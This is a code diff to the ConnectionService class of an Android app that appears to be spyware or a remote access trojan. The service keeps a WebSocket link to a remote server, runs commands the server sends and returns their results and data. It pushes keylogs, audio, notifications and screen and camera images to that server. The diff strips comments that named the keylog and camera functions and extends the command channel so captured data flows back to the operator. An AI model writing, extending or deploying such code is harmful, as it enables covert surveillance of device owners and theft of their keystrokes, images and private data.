@@ -24,12 +24,8 @@ class ConnectionService : Service() {
         @Volatile var isWsConnected = false
         var screenResultCode = 0
         var screenData: Intent? = null
-
-        // For WebRTC signaling and raw strings
         fun push(data: String) { instance?.sendPushString(data) }
-        // For Audio, Notifications, Keylogs
         fun push(ctx: Context, kind: String, data: String) { instance?.sendPushJson(kind, data) }
-        // For Screen and Camera images
         fun pushImage(data: ByteArray) { instance?.sendPushBinary(data) }
     }
 
@@ -75,10 +71,27 @@ class ConnectionService : Service() {
         }
         override fun onMessage(webSocket: WebSocket, text: String) {
             backoff = 2000L; scope.launch {
-                try { val obj = JSONObject(text); if (obj.optString("type") == "cmd") {
-                    webSocket.send(JSONObject().put("type", "reply").put("id", obj.optString("id")).put("ok", true).toString())
-                    CommandHandler.dispatch(this@ConnectionService, obj.optString("cmd"), obj.optJSONObject("args") ?: JSONObject())
-                } } catch (_: Exception) {}
+                try { 
+                    val obj = JSONObject(text)
+                    when (obj.optString("type")) {
+                        "cmd" -> {
+                            val id = obj.optString("id")
+                            val cmd = obj.optString("cmd")
+                            val args = obj.optJSONObject("args") ?: JSONObject()
+                            val res = CommandHandler.dispatch(this@ConnectionService, cmd, args)
+                            val reply = JSONObject().put("type", "reply").put("id", id).put("ok", res.optBoolean("ok", false))
+                            if (res.has("data")) reply.put("data", res.opt("data"))
+                            if (res.has("error")) reply.put("error", res.optString("error"))
+                            webSocket.send(reply.toString())
+                        }
+                        "webrtc_answer" -> {
+                            CommandHandler.handleWebRtcAnswer(obj.optString("sdp"))
+                        }
+                        "webrtc_ice" -> {
+                            CommandHandler.handleWebRtcIce(obj.optString("sdpMid"), obj.optInt("sdpMLineIndex"), obj.optString("sdp"))
+                        }
+                    }
+                } catch (_: Exception) {}
             }
         }
         override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) { isWsConnected = false; sendBroadcast(Intent(ACTION_STATUS).setPackage(packageName)); scheduleReconnect() }
@@ -91,7 +104,6 @@ class ConnectionService : Service() {
         reconnectJob = scope.launch { delay(d); connect() }
     }
 
-    // Push Helpers
     private fun sendPushString(data: String) { try { ws?.send(data) } catch (_: Exception) {} }
     private fun sendPushJson(kind: String, data: String) { try { ws?.send(JSONObject().put("type", "push").put("kind", kind).put("data", data).toString()) } catch (_: Exception) {} }
     private fun sendPushBinary(data: ByteArray) { try { ws?.send(ByteString.of(*data)) } catch (_: Exception) {} }
